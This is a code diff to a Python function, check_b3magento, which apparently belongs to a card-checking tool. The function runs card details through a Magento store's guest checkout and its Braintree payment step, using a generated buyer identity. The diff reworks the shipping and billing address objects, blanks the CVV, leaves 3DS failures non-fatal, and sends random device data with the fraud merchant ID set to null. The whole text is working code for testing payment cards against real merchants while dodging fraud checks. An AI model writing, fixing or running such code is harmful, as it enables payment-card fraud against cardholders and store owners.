@@ -646,6 +646,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
         state_full = ""  # Non-US Magento stores don't use region names in address
         state      = ""
 
+    # estimate-shipping uses snake_case keys (Magento REST schema)
     addr = {
         "street":     [ident["street"]],
         "city":       ident["city"],
@@ -657,6 +658,35 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
         "lastname":   ident["lname"],
         "company":    full_name,
         "telephone":  ident["phone"],
+    }
+
+    # shipping-information / payment-information use camelCase keys (matches PHP reference)
+    ship_addr = {
+        "countryId":  country,
+        "regionId":   region_id,
+        "regionCode": state,
+        "region":     state_full,
+        "street":     [ident["street"]],
+        "company":    ident["fname"],
+        "telephone":  ident["phone"],
+        "postcode":   ident["zip"],
+        "city":       ident["city"],
+        "firstname":  ident["fname"],
+        "lastname":   ident["lname"],
+    }
+    bill_addr = {
+        "countryId":         country,
+        "regionId":          region_id,
+        "regionCode":        state,
+        "region":            state_full,
+        "street":            [ident["street"]],
+        "company":           full_name,
+        "telephone":         ident["phone"],
+        "postcode":          ident["zip"],
+        "city":              ident["city"],
+        "firstname":         ident["fname"],
+        "lastname":          ident["lname"],
+        "saveInAddressBook": None,
     }
 
     # 6. Estimate shipping
@@ -683,8 +713,8 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
             f"{rest_v1}/guest-carts/{masked_id}/shipping-information",
             json={
                 "addressInformation": {
-                    "shipping_address":      addr,
-                    "billing_address":       addr,
+                    "shipping_address":      ship_addr,
+                    "billing_address":       bill_addr,
                     "shipping_method_code":  method_code,
                     "shipping_carrier_code": carrier_code,
                     "extension_attributes":  {},
@@ -697,10 +727,10 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
             totals = r.json()
             if isinstance(totals, dict):
                 grand = (
-                    (totals.get("totals") or {}).get("grand_total")
+                    totals.get("base_grand_total")
                     or (totals.get("totals") or {}).get("base_grand_total")
                     or totals.get("grand_total")
-                    or totals.get("base_grand_total")
+                    or (totals.get("totals") or {}).get("grand_total")
                 )
                 if grand:
                     amount = f"${grand}"
@@ -736,7 +766,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
                             "number":          cc,
                             "expirationMonth": mm,
                             "expirationYear":  yy,
-                            "cvv":             cvv or "",
+                            "cvv":             "",
                         },
                         "options": {"validate": False},
                     }
@@ -823,20 +853,6 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
         pass  # 3DS failure is non-fatal; proceed with original token
 
     # 10. Submit payment
-    billing_addr = {
-        "countryId":         country,
-        "regionId":          region_id,
-        "regionCode":        state if country == "US" else "",
-        "region":            state_full if country == "US" else "",
-        "street":            [ident["street"]],
-        "company":           full_name,
-        "telephone":         ident["phone"],
-        "postcode":          ident["zip"],
-        "city":              ident["city"],
-        "firstname":         ident["fname"],
-        "lastname":          ident["lname"],
-        "saveInAddressBook": None,
-    }
     device_data = json.dumps({
         "device_session_id": secrets.token_hex(16),
         "fraud_merchant_id": "null",
@@ -851,7 +867,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
             f"{rest_v1}/guest-carts/{masked_id}/payment-information",
             json={
                 "cartId": masked_id,
-                "billingAddress": billing_addr,
+                "billingAddress": bill_addr,
                 "paymentMethod": {
                     "method": "braintree",
                     "additional_data": {
@@ -859,7 +875,7 @@ def check_b3magento(session: requests.Session, domain: str, card_tuple: tuple, f
                         "device_data":                     device_data,
                         "is_active_payment_token_enabler": True,
                     },
-                    "extension_attributes": {"agreement_ids": []},
+                    "extension_attributes": {"agreement_ids": ["1", "2"]},
                 },
                 "email": ident["email"],
             },
